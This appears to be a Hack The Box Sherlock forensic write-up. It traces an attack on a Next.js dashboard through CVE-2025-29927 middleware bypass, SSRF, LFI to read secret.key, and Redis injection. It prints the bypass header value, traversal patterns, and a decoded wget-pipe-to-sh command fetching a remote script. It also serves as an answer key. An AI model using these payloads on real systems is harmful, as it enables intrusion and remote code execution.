NeuroSync-D (HTB)

Scenario

NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

https://app.hackthebox.com/sherlocks/NeuroSync-D

In this sherlock we will be dealing with CVE-2025-29927, a Next.js middleware authorization bypass where adding the internal header x-middleware-subrequest: middleware causes Next.js to skip middleware execution and allows access to protected routes as if the request were an internal subrequest.

References (useful reads):

https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware

https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass

https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/

https://tryhackme.com/room/nextjscve202529927

Artifacts Overview :

access.log:

This log records HTTP requests made to the NeuroSync web interface or backend API. It includes client IPs, timestamps, requested URLs, response codes, and user-agent details. It helps identify who accessed the system, what endpoints were targeted, and whether there were failed or unauthorized requests (for example, repeated 401 errors in the sample suggest authentication attempts or enumeration).

bci-device.log:

This log captures activity from a Brain-Computer Interface (BCI) device, showing commands being executed such as “Moving Up,” “Moving Down,” etc. It reflects real-time device control behavior, likely generated when the API sends commands to the physical or simulated BCI device. Anomalous sequences or unexpected timing here could indicate unauthorized control.

data-api.log:

This log belongs to the data API service that sends and manages BCI commands. It shows server startup details, migration of commands, and periodic push events like “MOVE_UP” and “MOVE_DOWN.” Essentially, it tracks how commands are queued and sent to the Redis message broker. It’s useful for correlating when and how the system generated or repeated control signals.

interface.log:

This log represents activity from the user interface layer, which in this setup appears to be a Next.js web dashboard running locally on port 3000. It contains details about compilation, HTTP routes, and requests hitting endpoints such as /api/bci/analytics. The headers and IPs here help trace interactions between the web UI, backend API, and external clients valuable for spotting unauthorized API access or routing through reverse proxies.

redis.log:

This is the Redis server log, showing low-level operations related to message queuing for BCI commands. Commands like “rpush” and “blpop” indicate that one service (likely data-api) is pushing commands into a Redis list (bci_commands), while another service (probably bci-device) is consuming them. This log is key for verifying command flow integrity and identifying if malicious commands were injected into the queue.

1- What version of Next.js is the application using?

15.1.0

I found the Next.js version in interface.log where the framework prints its runtime banner showing Next.js 15.1.0 during startup.

2- What local port is the Next.js-based application running on?

3000

The port information appears in the same interface.log, just a few lines below the framework reference.

3- A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?

CVE-2025-29927

I confirmed the CVE number through a quick Google search. I had already discussed this vulnerability earlier in the lab, and you can check the references section for detailed writeups about it.

4- The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?

main-app.js

By reviewing both access.log and interface.log, I noticed that access.log lists all web requests reaching the server, while interface.log only records the ones processed by the middleware. The attacker’s first requests targeted common static files like /framework.js, /main.js, and /common.js, all returning 404. The first successful response (HTTP 200) was for /main-app.js, meaning that’s the first retrievable file. In interface.log, we only see the failed ones since static file handling doesn’t pass through the middleware.

5- Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?

/api/bci/analytics

From analyzing access.log and interface.log, it looks like the attacker discovered a protected endpoint: /api/bci/analytics. In access.log, each request to it got a 401 Unauthorized response, which means it required valid authorization. In interface.log, the same requests were logged with headers, confirming that the middleware was enforcing access control for that route.

6- How many requests to this endpoint have resulted in an "Unauthorized" response?

5

Using grep "401" on the access.log shows five entries, meaning there were five unauthorized attempts before the successful one.

7- When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?

2025-04-01 11:38:05

After those five 401 responses, a 200 response appeared, showing the attacker finally accessed the protected resource.

8- Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?

x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

You can see the header sequence in the logs or the blog posts listed in the references. The attacker added the header x-middleware-subrequest with the value middleware, and when that failed, they kept adding :middleware each time. The successful request had five repetitions, making it x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware. After that, the middleware logs stopped showing the requests, confirming the bypass worked.

9- The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?

4000

In data-api.log, the first lines reveal another application running internally on port 4000

10- After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?

/logs

The attacker kept abusing the SSRF through the same Next.js vulnerability to probe the internal API. After testing several endpoints, they first found /analytics, which wasn’t exploitable since it only stored and returned analytics data. Then they found /logs, which reads log files within /var/log/. That endpoint turned out to be vulnerable to LFI because it accepted a file path input.

11- When the vulnerable endpoint found was used maliciously for the first time?

2025-04-01 11:39:01

The attacker then tried reading sensitive files, starting with /etc/passwd, using path traversal sequences.

12- What is the attack name the endpoint is vulnerable to?

Local File Inclusion

It was clear this was an LFI attack because of the traversal patterns like ../../../../. These characters are used to move up directories and access files outside the allowed path.

13- What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?

secret.key

Scrolling a bit further in the logs shows the attacker eventually targeting the file secret.key

14- Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?

OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb

Looking at redis.log, I found several Redis commands like PING, KEYS *, and SET test test, followed by a suspicious payload that contained an OS command. That indicates the attacker tried to execute code through Redis.

15- Once decoded, what is the command?

wget http://185.202.2.147/h4Pln4/run.sh -O- | sh

The decoded payload showed the command was executed on the BCI devices. You can confirm it in bci_device.log or use CyberChef to decode it.
